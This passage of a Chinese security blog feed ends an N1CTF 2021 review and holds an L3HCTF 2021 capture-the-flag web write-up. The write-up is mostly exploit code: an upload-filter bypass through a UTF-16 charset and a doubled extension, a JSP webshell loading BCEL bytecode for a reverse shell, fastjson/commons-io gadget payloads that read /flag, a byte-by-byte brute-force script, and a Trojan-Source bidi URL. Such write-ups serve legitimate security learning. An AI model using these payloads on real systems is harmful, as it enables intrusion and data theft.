class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div></pre></td><td class="code"><pre><div class="line">acpi_tables</div><div class="line">apparmor_events</div><div class="line">arp_cache</div><div class="line">azure_instance_tags</div><div class="line">block_devices</div><div class="line">bpf_process_events</div><div class="line">bpf_socket_events</div><div class="line">carbon_black_info</div><div class="line">cpu_time</div><div class="line">cpuid</div><div class="line">device_hash</div><div class="line">device_partitions</div><div class="line">docker_images</div><div class="line">docker_info</div><div class="line">docker_version</div><div class="line">ec2_instance_metadata</div><div class="line">ec2_instance_tags</div><div class="line">etc_protocols</div><div class="line">etc_services</div><div class="line">extended_attributes</div><div class="line">file_events</div><div class="line">hardware_events</div><div class="line">intel_me_info</div><div class="line">interface_addresses</div><div class="line">interface_details</div><div class="line">interface_ipv6</div><div class="line">iptables</div><div class="line">kernel_info</div><div class="line">kernel_modules</div><div class="line">last</div><div class="line">listening_ports</div><div class="line">lldp_neighbors</div><div class="line">load_average</div><div class="line">logged_in_users</div><div class="line">lxd_certificates</div><div class="line">lxd_cluster</div><div class="line">lxd_cluster_members</div><div class="line">lxd_networks</div><div class="line">lxd_storage_pools</div><div class="line">md_devices</div><div class="line">md_drives</div><div class="line">md_personalities</div><div class="line">memory_array_mapped_addresses</div><div class="line">memory_arrays</div><div class="line">memory_device_mapped_addresses</div><div class="line">memory_devices</div><div class="line">memory_error_info</div><div class="line">memory_info</div><div class="line">memory_map</div><div class="line">mounts</div><div class="line">msr</div><div class="line">oem_strings</div><div class="line">osquery_events</div><div class="line">osquery_extensions</div><div class="line">osquery_flags</div><div class="line">osquery_info</div><div class="line">osquery_packs</div><div class="line">osquery_registry</div><div class="line">osquery_schedule</div><div class="line">pci_devices</div><div class="line">platform_info</div><div class="line">portage_keywords</div><div class="line">portage_packages</div><div class="line">portage_use</div><div class="line">process_events</div><div class="line">process_file_events</div><div class="line">process_open_pipes</div><div class="line">prometheus_metrics</div><div class="line">seccomp_events</div><div class="line">secureboot</div><div class="line">selinux_events</div><div class="line">selinux_settings</div><div class="line">shared_memory</div><div class="line">smart_drive_info</div><div class="line">smbios_tables</div><div class="line">socket_events</div><div class="line">startup_items</div><div class="line">sudoers</div><div class="line">syslog_events</div><div class="line">system_info</div><div class="line">systemd_units</div><div class="line">time</div><div class="line">ulimit_info</div><div class="line">uptime</div><div class="line">usb_devices</div><div class="line">user_events</div><div class="line">yara_events</div></pre></td></tr></table></figure><p>当时只做到了这一步，赛后看了wp，对一些表的用法还是感觉不太理解，题目环境目前访问不了了，暂时无法复现</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>感觉这次有几道题乍一看挺简单的，实际上并不容易，通过这次复盘学到了很多有意思的trick，都是之前不曾见过的，还是挺有意义的，总之，还有很多东西要学 &gt;-&lt;~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2021-n1ctf-复盘&quot;&gt;&lt;a href=&quot;#2021-n1ctf-复盘&quot; class=&quot;headerlink&quot; title=&quot;2021 n1ctf 复盘&quot;&gt;&lt;/a&gt;2021 n1ctf 复盘&lt;/h1&gt;&lt;h3 id=&quot;signin&quot;&gt;&lt;a href=&quot;#sig
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2021 L3HCTF 部分web wp</title>
    <link href="https://c1aysec.github.io/2021/11/19/2021%20L3HCTF%20%E9%83%A8%E5%88%86web%20wp/"/>
    <id>https://c1aysec.github.io/2021/11/19/2021 L3HCTF 部分web wp/</id>
    <published>2021-11-18T17:00:57.170Z</published>
    <updated>2021-11-18T17:18:46.025Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2021-L3HCTF-部分web-wp"><a href="#2021-L3HCTF-部分web-wp" class="headerlink" title="2021 L3HCTF 部分web wp"></a>2021 L3HCTF 部分web wp</h1><p>团队最终排名第15，仅记录个人参与解出的题</p><h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><p>UploadServlet.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> com.l3hsec;</div><div class="line"></div><div class="line"><span class="keyword">import</span> org.apache.commons.fileupload.FileItem;</div><div class="line"><span class="keyword">import</span> org.apache.commons.fileupload.disk.DiskFileItemFactory;</div><div class="line"><span class="keyword">import</span> org.apache.commons.fileupload.servlet.ServletFileUpload;</div><div class="line"></div><div class="line"><span class="keyword">import</span> javax.servlet.ServletException;</div><div class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</div><div class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</div><div class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</div><div class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</div><div class="line"><span class="keyword">import</span> java.io.File;</div><div class="line"><span class="keyword">import</span> java.io.IOException;</div><div class="line"><span class="keyword">import</span> java.io.PrintWriter;</div><div class="line"><span class="keyword">import</span> java.util.List;</div><div class="line"><span class="keyword">import</span> java.util.UUID;</div><div class="line"><span class="keyword">import</span> java.util.regex.Matcher;</div><div class="line"><span class="keyword">import</span> java.util.regex.Pattern;</div><div class="line"></div><div class="line"><span class="meta">@WebServlet</span>(<span class="string">"/UploadServlet"</span>)</div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UploadServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</div><div class="line"></div><div class="line">    <span class="comment">// 上传文件存储目录</span></div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String UPLOAD_DIRECTORY = <span class="string">"upload"</span>;</div><div class="line"></div><div class="line">    <span class="comment">// 上传配置</span></div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MEMORY_THRESHOLD = <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">3</span>;</div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MAX_FILE_SIZE = <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">1</span>;</div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MAX_REQUEST_SIZE = <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">1</span>;</div><div class="line"></div><div class="line">    <span class="comment">/**</span></div><div class="line"><span class="comment">     * 上传数据及保存文件</span></div><div class="line"><span class="comment">     */</span></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request,</span></span></div><div class="line"><span class="function"><span class="params">                          HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</div><div class="line"></div><div class="line">        response.setCharacterEncoding(<span class="string">"UTF-8"</span>);</div><div class="line">        response.setContentType(<span class="string">"text/html;charset=UTF-8"</span>);</div><div class="line"></div><div class="line"></div><div class="line">        DiskFileItemFactory factory = <span class="keyword">new</span> DiskFileItemFactory();</div><div class="line">        factory.setSizeThreshold(MEMORY_THRESHOLD);</div><div class="line">        factory.setRepository(<span class="keyword">new</span> File(System.getProperty(<span class="string">"java.io.tmpdir"</span>)));</div><div class="line"></div><div class="line">        ServletFileUpload upload = <span class="keyword">new</span> ServletFileUpload(factory);</div><div class="line"></div><div class="line">        upload.setFileSizeMax(MAX_FILE_SIZE);</div><div class="line"></div><div class="line">        upload.setSizeMax(MAX_REQUEST_SIZE);</div><div class="line"></div><div class="line">        upload.setHeaderEncoding(<span class="string">"UTF-8"</span>);</div><div class="line"></div><div class="line"></div><div class="line">        String userDir = md5(request.getRemoteAddr());</div><div class="line">        String uploadPath = request.getServletContext().getRealPath(<span class="string">"./"</span>) + File.separator + UPLOAD_DIRECTORY + File.separator + userDir;</div><div class="line"></div><div class="line"></div><div class="line">        File uploadDir = <span class="keyword">new</span> File(uploadPath);</div><div class="line">        <span class="keyword">if</span> (!uploadDir.exists()) &#123;</div><div class="line">            uploadDir.mkdir();</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            List&lt;FileItem&gt; formItems = upload.parseRequest(request);</div><div class="line"></div><div class="line">            <span class="keyword">if</span> (formItems != <span class="keyword">null</span> &amp;&amp; formItems.size() &gt; <span class="number">0</span>) &#123;</div><div class="line">                <span class="keyword">for</span> (FileItem item : formItems) &#123;</div><div class="line">                    <span class="keyword">if</span> (!item.isFormField()) &#123;</div><div class="line">                        String fileName = <span class="keyword">new</span> File(item.getName()).getName();</div><div class="line">                        <span class="keyword">if</span> (fileName.lastIndexOf(<span class="string">'.'</span>) == -<span class="number">1</span>) &#123;</div><div class="line">                            PrintWriter writer = response.getWriter();</div><div class="line">                            writer.println(<span class="string">"Error: 缺少文件后缀！"</span>);</div><div class="line">                            writer.flush();</div><div class="line">                            <span class="keyword">return</span>;</div><div class="line">                        &#125;</div><div class="line"></div><div class="line"></div><div class="line">                        String ext = fileName.substring(fileName.lastIndexOf(<span class="string">'.'</span>));</div><div class="line">                        ext = checkExt(ext);</div><div class="line"></div><div class="line">                        String filePath = uploadPath + File.separator + randName() + ext;</div><div class="line">                        File storeFile = <span class="keyword">new</span> File(filePath);</div><div class="line"></div><div class="line">                        String content = item.getString();</div><div class="line">                        <span class="keyword">boolean</span> check = checkValidChars(content);</div><div class="line"></div><div class="line">                        <span class="keyword">if</span> (check)&#123;</div><div class="line">                            response.getWriter().write(<span class="string">"上传失败：检测到可见字符"</span>);</div><div class="line">                            <span class="keyword">return</span>;</div><div class="line">                        &#125;</div><div class="line"></div><div class="line">                        <span class="comment">//居然被绕过了，得再加一层过滤</span></div><div class="line">                        BlackWordsDetect blackWordsDetect = <span class="keyword">new</span> BlackWordsDetect(item);</div><div class="line">                        <span class="keyword">boolean</span> detectResult = blackWordsDetect.detect();</div><div class="line">                        <span class="keyword">if</span> (detectResult) &#123;</div><div class="line">                            response.getWriter().write(<span class="string">"上传失败：检测到黑名单关键字！ "</span> + blackWordsDetect.getBlackWord());</div><div class="line">                            <span class="keyword">return</span>;</div><div class="line">                        &#125; <span class="keyword">else</span> &#123;</div><div class="line">                            item.write(storeFile);</div><div class="line">                            response.getWriter().write(<span class="string">"文件上传成功! 文件路径: "</span> + filePath);</div><div class="line">                        &#125;</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125; <span class="keyword">catch</span> (Exception ex) &#123;</div><div class="line">            response.getWriter().write(</div><div class="line">                    <span class="string">"上传失败：错误原因: "</span> + ex.getMessage());</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">md5</span><span class="params">(String s)</span> </span>&#123;</div><div class="line">        String ret = <span class="keyword">null</span>;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            java.security.MessageDigest m;</div><div class="line">            m = java.security.MessageDigest.getInstance(<span class="string">"MD5"</span>);</div><div class="line">            m.update(s.getBytes(), <span class="number">0</span>, s.length());</div><div class="line">            ret = <span class="keyword">new</span> java.math.BigInteger(<span class="number">1</span>, m.digest()).toString(<span class="number">16</span>).toLowerCase();</div><div class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> ret;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">randName</span><span class="params">()</span> </span>&#123;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> UUID.randomUUID().toString();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">checkValidChars</span><span class="params">(String content)</span> </span>&#123;</div><div class="line">        Pattern pattern = Pattern.compile(<span class="string">"[a-zA-Z0-9]&#123;2,&#125;"</span>);</div><div class="line">        Matcher matcher = pattern.matcher(content);</div><div class="line">        <span class="keyword">return</span> matcher.find();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">checkExt</span><span class="params">(String ext)</span> </span>&#123;</div><div class="line">        ext = ext.toLowerCase();</div><div class="line"></div><div class="line">        String[] blackExtList = &#123;</div><div class="line">                <span class="string">"jsp"</span>, <span class="string">"jspx"</span></div><div class="line">        &#125;;</div><div class="line">        <span class="keyword">for</span> (String blackExt : blackExtList) &#123;</div><div class="line">            <span class="keyword">if</span> (ext.contains(blackExt)) &#123;</div><div class="line">                ext = ext.replace(blackExt, <span class="string">""</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> ext;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>通过<code>Content-Type: application/octet-stream; charset=utf-16;</code>可以绕过<code>checkValidChars</code>函数当中<code>Pattern.compile(&quot;[a-zA-Z0-9]{2,}&quot;);</code>的限制，jsp后缀双写可成功上传jsp，然后接下来是绕过jsp文件内容检测，过滤了<code>Runtime、invoke、newInstance、setAccessible、loadClass、\u、defineClass</code>等很多关键字</p><p>但是<code>forName</code>和<code>ClassLoader</code>没有被过滤，可以通过加载BCEL字节码的方式进行绕过，首先编写一个恶意类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.lang.*;</div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</div><div class="line">    <span class="keyword">static</span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">try</span></div><div class="line">        &#123;</div><div class="line">            Runtime.getRuntime().exec(<span class="string">"反弹shell"</span>).waitFor();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">catch</span> (Exception e)</div><div class="line">        &#123;</div><div class="line"></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>生成BCEL字节码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$$BCEL$$$l$<span class="number">8</span>b$I$A$A$A$A$A$A......</div></pre></td></tr></table></figure><p>构造上传数据包：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">POST /UploadServlet HTTP/<span class="number">1.1</span></div><div class="line">Host: <span class="number">123.60</span>.20.221:<span class="number">10001</span></div><div class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">74.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">74.0</span></div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></div><div class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></div><div class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></div><div class="line"><span class="comment">Content-Type: multipart/form-data; boundary=---------------------------2171785994239904794759952369</span></div><div class="line"><span class="comment">Content-Length: 1544</span></div><div class="line"><span class="comment">Origin: http://123.60.20.221:10001</span></div><div class="line"><span class="comment">Connection: close</span></div><div class="line"><span class="comment">Referer: http://123.60.20.221:10001/</span></div><div class="line"><span class="comment">Cookie: JSESSIONID=880DC23EAD4740C913DFE4D657EFB0E1</span></div><div class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">-----------------------------2171785994239904794759952369</span></div><div class="line"><span class="comment">Content-Disposition: form-data; name="uploadFile"; filename="1.jsjspp"</span></div><div class="line"><span class="comment">Content-Type: application/octet-stream; charset=utf-16;</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">&lt;%@ page import="java.util.*,java.io.*"%&gt;</span></div><div class="line"><span class="comment">&lt;% String a="111";a.getClass().forName("$$BCEL$$$l$8b$I$A$A$A$A$A$A......",true,new com.sun.org.apache.bcel.internal.util.ClassLoader()); %&gt;</span></div><div class="line"><span class="comment">-----------------------------2171785994239904794759952369--</span></div></pre></td></tr></table></figure><p>上传成功</p><p><img src="http://pic.c1imber.top/blog/20211119/uOi4U0i1s8QJ.png?imageslim" alt="mark"></p><p>访问webshell即可反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://123.60.20.221:10001/upload/adeacf493deabc9b95a5d3f8ceaefb5a/162862ec-28d0-4e96-98fd-534a0eba6338.jsp</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211119/NSF5I8yhYEKy.png?imageslim" alt="mark"></p><p><code>L3HCTF{J4v4_1S_s0_fUN_4nd_U_must_b3_j4v4_k1ng}</code></p><p>（这里还能进行tomcat回显，以应对实战中不出网的情况，这里不再赘述，感兴趣的师傅可以尝试构造一下）</p><h3 id="cover"><a href="#cover" class="headerlink" title="cover:"></a>cover:</h3><p>admin/123456登录成功</p><p>题目给了提示：<br>HINT: fastjson:1.2.68 JSON.parseArray(data,User.class);</p><p>经过测试发现存在common-io依赖</p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">POST /dynamic_table HTTP/<span class="number">1.1</span></div><div class="line">Host: <span class="number">124.71</span>.173.23:<span class="number">8088</span></div><div class="line">Cookie: JSESSIONID=<span class="number">4431</span>B0C9A81DD94C20987DEA61CBE3E5</div><div class="line">Connection: close</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: <span class="number">335</span></div><div class="line"></div><div class="line">data=[&#123;<span class="string">"age"</span>:<span class="string">"20"</span>,<span class="string">"id"</span>:<span class="number">1</span>,<span class="string">"password"</span>:<span class="string">"hhhhhh"</span>,<span class="string">"userName"</span>:&#123;<span class="string">"@type"</span>:<span class="string">"java.lang.AutoCloseable"</span>,<span class="string">"@type"</span>:<span class="string">"org.apache.commons.io.input.ReaderInputStream"</span>,<span class="string">"reader"</span>:&#123;<span class="string">"@type"</span>:<span class="string">"org.apache.commons.io.input.CharSequenceReader"</span>,<span class="string">"charSequence"</span>:&#123;<span class="string">"@type"</span>:<span class="string">"java.lang.String"</span><span class="string">"aaaaaa"</span>,<span class="string">"start"</span>:<span class="number">0</span>,<span class="string">"end"</span>:<span class="number">2147483647</span>&#125;,<span class="string">"charsetName"</span>:<span class="string">"UTF-8"</span>,<span class="string">"bufferSize"</span>:<span class="number">1024</span>&#125;&#125;]</div></pre></td></tr></table></figure><p>本地测试网上公开写文件的payload后发现</p><p>文章：<a href="https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg" target="_blank" rel="external">https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg</a></p><p>当解析json的方式为<code>JSON.parseObject(s,xxx.class)</code>时，文件可以正常写入</p><p>当解析json的方式为<code>JSON.parseArray(s,xxx.class)</code>时（该题目的方式），会出现报错，文件写入失败（只能创建文件但是内容写不进去）</p><p>搜索到今年blackhat分享的读文件利用链</p><p><a href="https://paper.seebug.org/1698/#3commons-io" target="_blank" rel="external">https://paper.seebug.org/1698/#3commons-io</a></p><p>可以通过commons-io逐字节读文件内容payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">POST /dynamic_table HTTP/<span class="number">1.1</span></div><div class="line">Host: <span class="number">124.71</span>.173.23:<span class="number">8088</span></div><div class="line">Cookie: JSESSIONID=<span class="number">13362E0192</span>EFCF68C5297D5CA44BC258</div><div class="line">Connection: close</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: <span class="number">418</span></div><div class="line"></div><div class="line">data=[&#123;<span class="string">"age"</span>:<span class="string">"20"</span>,<span class="string">"id"</span>:<span class="number">1</span>,<span class="string">"password"</span>:<span class="string">"hhhhhh"</span>,<span class="string">"userName"</span>:&#123;<span class="string">"abc"</span>:&#123;<span class="string">"@type"</span>:<span class="string">"java.lang.AutoCloseable"</span>,<span class="string">"@type"</span>:<span class="string">"org.apache.commons.io.input.BOMInputStream"</span>,<span class="string">"delegate"</span>:&#123;<span class="string">"@type"</span>:<span class="string">"org.apache.commons.io.input.ReaderInputStream"</span>,<span class="string">"reader"</span>:&#123;<span class="string">"@type"</span>:<span class="string">"jdk.nashorn.api.scripting.URLReader"</span>,<span class="string">"url"</span>:<span class="string">"file:///flag"</span>&#125;,<span class="string">"charsetName"</span>:<span class="string">"UTF-8"</span>,<span class="string">"bufferSize"</span>:<span class="number">1024</span>&#125;,<span class="string">"boms"</span>:[&#123;<span class="string">"charsetName"</span>:<span class="string">"UTF-8"</span>,<span class="string">"bytes"</span>:[<span class="number">76</span>]&#125;]&#125;,<span class="string">"address"</span>:&#123;<span class="string">"$ref"</span>:<span class="string">"$.abc.BOM"</span>&#125;&#125;&#125;]</div></pre></td></tr></table></figure><p>判断出flag文件为/flag，文件内容第一个字节为76(TA==)，也就是L</p><p><img src="http://pic.c1imber.top/blog/20211119/p3il0bBSYNkD.png?imageslim" alt="mark"></p><p>编写python:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line">session = requests.Session()</div><div class="line">bytess=<span class="string">""</span></div><div class="line">flag=<span class="string">""</span></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">128</span>):</div><div class="line">        paramsPost = &#123;<span class="string">"data"</span>:<span class="string">"[&#123;\"age\":\"20\",\"id\":1,\"password\":\"hhhhhh\",\"userName\":&#123;\"abc\":&#123;\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.BOMInputStream\",\"delegate\":&#123;\"@type\":\"org.apache.commons.io.input.ReaderInputStream\",\"reader\":&#123;\"@type\":\"jdk.nashorn.api.scripting.URLReader\",\"url\":\"file:///flag\"&#125;,\"charsetName\":\"UTF-8\",\"bufferSize\":1024&#125;,\"boms\":[&#123;\"charsetName\":\"UTF-8\",\"bytes\":[%s]&#125;]&#125;,\"address\":&#123;\"\x24ref\":\"\x24.abc.BOM\"&#125;&#125;&#125;]"</span>%(bytess+str(i))&#125;</div><div class="line">        <span class="comment">#print(paramsPost)</span></div><div class="line">        headers = &#123;<span class="string">"Connection"</span>:<span class="string">"close"</span>,<span class="string">"Content-Type"</span>:<span class="string">"application/x-www-form-urlencoded"</span>&#125;</div><div class="line">        cookies = &#123;<span class="string">"JSESSIONID"</span>:<span class="string">"2B4C807D2AA638E483515AC7F27E0869"</span>&#125;</div><div class="line">        response = session.post(<span class="string">"http://124.71.173.23:8088/dynamic_table"</span>, data=paramsPost, headers=headers, cookies=cookies)</div><div class="line">        <span class="comment">#print(response.text)</span></div><div class="line">        <span class="keyword">if</span> <span class="string">"bOM"</span> <span class="keyword">in</span> response.text:</div><div class="line">            bytess=bytess+str(i)+<span class="string">","</span></div><div class="line">            flag+=chr(i)</div><div class="line">            print(flag)</div><div class="line">            <span class="keyword">break</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211119/x8YqwRaqx7sh.png?imageslim" alt="mark"></p><p><code>L3HCTF{cov3r_means_discover_4nd_k1ll_1t_over!!}</code></p><h3 id="Easy-PHP"><a href="#Easy-PHP" class="headerlink" title="Easy PHP"></a>Easy PHP</h3><p>代码如下：</p><p><img src="http://pic.c1imber.top/blog/20211119/5uVPpCQr8jSh.png?imageslim" alt="mark"></p><p>根据预期传入username=admin&amp;password=l3hctf没有反应</p><p><img src="http://pic.c1imber.top/blog/20211119/SxXExABdXdFn.png?imageslim" alt="mark"></p><p>题目提示是RGB，猜测存在隐写</p><p>然后就鼠标双击复制粘贴payload就可以了</p><p>复制完直接粘贴，构造的url为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://124.71.176.131:10001/index.php?username=admin&amp;%E2%80%AE%E2%81%A6L3H%E2%81%A9%E2%81%A6password=%E2%80%AE%E2%81%A6CTF%E2%81%A9%E2%81%A6l3hctf</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211119/FchXAUbPFvTW.png?imageslim" alt="mark"></p><p><code>flag{Y0U_F0UND_CVE-2021-42574!}</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2021-L3HCTF-部分web-wp&quot;&gt;&lt;a href=&quot;#2021-L3HCTF-部分web-wp&quot; class=&quot;headerlink&quot; title=&quot;2021 L3HCTF 部分web wp&quot;&gt;&lt;/a&gt;2021 L3HCTF 部分web wp&lt;/h1&gt;&lt;
      
    
    </summary>
    
